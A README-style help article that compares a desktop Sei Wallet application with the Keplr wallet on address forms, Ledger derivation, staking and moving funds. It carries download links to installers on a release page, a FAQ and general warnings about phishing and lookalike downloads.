![Sei Wallet](https://github.com/sei-chain/sei-wallet-help/raw/main/assets/banner-article.png)

<h1 align="center">Sei Wallet and Keplr: two ways to hold SEI</h1>

<p align="center">An extension and a desktop app, compared on custody, staking and reach.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Keplr is a Cosmos-first wallet: a multi-chain application built around the Cosmos ecosystem, available as a browser extension and on mobile. Sei Wallet is a desktop application built EVM-first, which signs `0x` transactions natively and shows legacy `sei1` addresses read-only.

That single design difference explains almost every practical difference between them — which address an app hands you, which app on a Ledger it talks to, and which kind of application it can connect to. It is not a question of one being more secure; it is a question of which shape of Sei you are holding and what you want to do with it.

## The difference in one table

| | Sei Wallet | Keplr |
|---|---|---|
| Primary address form | `0x…` (EVM) | `sei1…` (Cosmos) |
| Platform | Desktop application | Browser extension, mobile |
| Signing model | EVM-native | Cosmos-native |
| Ledger path | Ledger's Ethereum app | Ledger's Cosmos app |
| Staking | Built in | Built in |
| Multi-chain scope | Sei | Many Cosmos chains |
| EVM dapp support | Native | Not its primary role |

Read the first two rows together. The address form follows from the signing model, and the signing model is what the wallet was built around. A Cosmos-native wallet produces Cosmos addresses; an EVM-native wallet produces EVM addresses. That is why the same seed can appear in both with different addresses — they are different accounts derived from the same phrase.

If that sentence is confusing, the mechanism is in [the two address representations](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md), and it is worth ten minutes because it prevents the most common support question either wallet receives.

## What this means on a Ledger

A hardware wallet holds a seed and derives accounts on request. The derivation path comes from the app the wallet talks to: the Ethereum app produces Ethereum-style accounts, the Cosmos app produces Cosmos-style accounts.

So pairing the same device with the two wallets can legitimately produce two different addresses, one holding your balance and one holding nothing. Nothing has moved and nothing is broken. The symptom, the diagnosis and the fix are in the derivation problem, a trap that awaits any two wallets which disagree about derivation.

The practical rule for both: before connecting, write down the address the current setup attributes to that device, then compare after connecting. The pairing steps for the EVM path are the same ones any EVM-first wallet uses: device unlocked, Ethereum app open, address compared before signing.

## Staking, in both

Delegation is a chain-level action, so both wallets can do it, and neither has an advantage in the mechanics: same validators, same rewards, same unbonding period set by the network.

What differs is presentation. Neither app can make an unbonding position liquid early, and neither can pay a fee out of bonded stake — the reserve problem is a property of the chain, not of the interface. If you stake everything in either wallet, you cannot pay for your own exit, and the fix is a small transfer from somewhere else. That failure mode is covered in [staking in this wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md).

## Which one to use

**Choose the EVM-first desktop app if** your activity is on Sei's EVM side: `0x` addresses, EVM applications, a single chain, and a preference for a desktop application over a browser extension.

**Choose Keplr if** you hold several Cosmos chains and want one interface for all of them, or if you are already using it for other networks and do not want a second tool.

**Using both is legitimate**, with one caveat: every app that receives your seed becomes one more place it can escape from. A wallet you installed to try once and forgot is still an attack surface. If you stop using one, remove it rather than leaving it dormant.

What each wallet is, and who runs it, is covered in [what this wallet is](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

## Moving between them

If you already hold SEI in Keplr and want it here, that is a transfer between two accounts, not a conversion: the coins stay native SEI and the address changes. The steps, including which address form to send to, are a normal transfer, and the reverse direction is the same operation with the roles swapped.

The one rule that matters: send to the address form the destination actually signs for. Sending native SEI to a `sei1` address that the receiving app shows read-only is how a deposit appears to vanish.

## What neither wallet solves

A wallet is not a security audit, and this comparison does not change that. Sei Wallet describes its builds as audited and signed, with the report published in the audit repository; the wider position is set out in [the safety guide](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md). I have not reviewed Keplr's security claims in this project, and nothing here is a verdict on either product's code.

Both wallets face the same attacks, and neither design changes them:

- a lookalike download, which no address format protects you from;
- a phishing page asking for your phrase;
- an approval you did not read.

A download from the wrong domain defeats either wallet equally, and approving without reading does the same.

## Is Keplr a scam?

It is a widely used Cosmos wallet with a long public history, and this project has no evidence against it. That is a different statement from "verified" or "endorsed": I did not review its code, its audit reports or its company records, so the honest answer is that it is widely used and I did not assess it.

The same discipline applies to this product in the opposite direction: widely used is not verified, and unverified is not unsafe.

## If you use MetaMask for other chains

A third option is to add Sei to an EVM wallet you already run, which keeps everything in one interface but gives up staking and adds address-handling traps. That route, with its pitfalls, is in [the MetaMask installation](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md). For a broader EVM comparison, [Rabby and Sei Wallet side by side](https://github.com/sei-chain/sei-wallet-help/blob/main/rabby-compared-with-a-desktop-app.md) is the closer match.

## Frequently asked questions

**Is Keplr better than Sei Wallet?** Neither is better in the abstract. Keplr is Cosmos-first and multi-chain; this app is EVM-first and single-chain. The address form you need usually decides it.

**Can I use the same seed in both?** Yes, and that is why the same phrase can show two different addresses. Each app derives the account its own way.

**Why does Keplr show a different address for my Ledger?** Different derivation path, because it talks to a different app on the device. Both accounts are real.

**Which one should I use for staking?** Either. Delegation is a chain action with the same validators and the same unbonding rules.

**Does Keplr support `0x` addresses?** It is built around Cosmos addresses; whether a given version exposes the EVM form is a question for its own documentation, and I did not verify it here.

**Can I hold both at once?** Yes. Keep the seed exposure in mind: every app you import it into is another place it can leak from.

**Do I need to move my funds to switch?** Yes, as a normal transfer. Wallets do not share accounts, even when they share a seed phrase.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [How to stake SEI in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md)
- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
